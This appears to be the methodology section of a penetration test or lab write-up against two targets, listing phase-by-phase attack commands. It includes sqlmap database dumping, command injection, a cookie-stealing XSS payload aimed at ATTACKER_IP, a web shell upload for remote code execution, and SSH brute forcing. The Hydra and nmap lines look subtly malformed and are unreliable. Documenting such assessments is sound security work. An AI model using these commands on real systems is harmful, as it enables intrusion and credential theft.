# Methodology

The assessment followed a structured, phased approach against both in-scope targets (`68.183.xx.xxx` and `209.38.xxx.xxx`), aligned broadly with the OWASP Testing Guide and standard penetration testing workflow: **Reconnaissance → Enumeration → Vulnerability Analysis → Exploitation → Post-Exploitation → Reporting**.

## 1. Network Reconnaissance (Nmap)
Performed comprehensive TCP port and service discovery against both targets, followed by Nmap Scripting Engine (NSE) vulnerability checks to identify exposed services and candidate weaknesses.

```bash
nmap -sС -sV -p- -T4 68.183.xx.xxx
nmap --script vuln 68.183.xx.xxx
```

**Screenshots:** `Screenshots/Reconnaissance/`

## 2. Web Application Enumeration (Gobuster)
Enumerated directories, files, and hidden endpoints on the web application to locate administrative panels, backup files, and additional entry points.

```bash
gobuster dir -u http://68.183.xx.xxx:8081 -w /usr/share/wordlists/dirb/common.txt
```

This uncovered directories such as `/assets`, `/logs`, `/uploads`, and `/flags`.

**Screenshots:** `Screenshots/Enumeration/`

## 3. Web Vulnerability Scanning (Nikto)
Scanned the HTTP service for common misconfigurations, exposed files, and known web server/application issues (e.g. missing security headers, cookies without the `HttpOnly` flag).

```bash
nikto -h http://68.183.xx.xxx:8081
```

**Screenshots:** `Screenshots/Enumeration/`

## 4. Authentication & Injection Testing (sqlmap / manual)
Tested the login form and suspicious URL parameters for SQL injection and authentication-bypass vectors in a controlled, non-destructive manner — both boolean-based blind and UNION-based techniques.

```bash
sqlmap -u "http://68.183.xx.xxx:8081/login.php" --data="username=admin&password=test" --dbs --batch
sqlmap -u "http://68.183.xx.xxx:8081/dashboard.php?query=1" --dump
```

**Screenshots:** `Screenshots/SQLi/`

## 5. Command Injection Testing
Injected shell metacharacters into vulnerable parameters to achieve arbitrary command execution.

```bash
curl "http://68.183.xx.xxx:8081/page.php?cmd=;id"
```

**Screenshots:** `Screenshots/Command-Injection/`

## 6. Cross-Site Scripting (XSS) Testing
Injected both plaintext and URL-encoded JavaScript payloads into reflected parameters to test input sanitization and cookie exposure.

```
<script>document.location='http://ATTACKER_IP/steal?c='+document.cookie</script>
```

**Screenshots:** `Screenshots/XSS/`

## 7. Insecure Direct Object Reference / File Permission Testing
Directly manipulated URLs/paths discovered during enumeration (e.g. `/src/flags/secret.png`) to access restricted resources without authorization.

**Screenshots:** `Screenshots/IDOR/`

## 8. Steganographic Analysis (Steghide)
Inspected discovered image artifacts for embedded content and performed a dictionary-based brute-force attack against the steganographic passphrase.

```bash
stegseek secret.png /usr/share/wordlists/rockyou.txt
```

**Screenshots:** `Screenshots/IDOR/`

## 9. Unrestricted File Upload → RCE
Uploaded a PHP web shell through an insecure file upload function and accessed it via its predictable URL to gain remote code execution.

```bash
curl -F "file=@shell.php" http://68.183.xx.xxx:8081/dashboard.php
```

**Screenshots:** `Screenshots/File-Upload/`

## 10. SSH Brute-Force (Hydra)
Performed a dictionary-based brute-force attack against the SSH service on Target 2 using `rockyou.txt` and a known/guessed username.

```bash
hydra -l /usr/share/wordlists/rockyou.txt ssh://209.38.xxx.xxx
```

**Screenshots:** `Screenshots/SSH/`

## 11. Post-Exploitation
After gaining SSH access, ran LinPEAS to enumerate local privilege escalation vectors on Target 2.

```bash
./linpeas.sh
```

**Screenshots:** `Screenshots/SSH/`

## 12. Encoding & Translation
Used online tools to URL-encode XSS payloads and to decode a Morse-code-encoded flag recovered during command injection testing.

- URL Encoder: https://www.urlencoder.org/
- Morse Code Translator: https://dnschecker.org/morse-code-translator.php
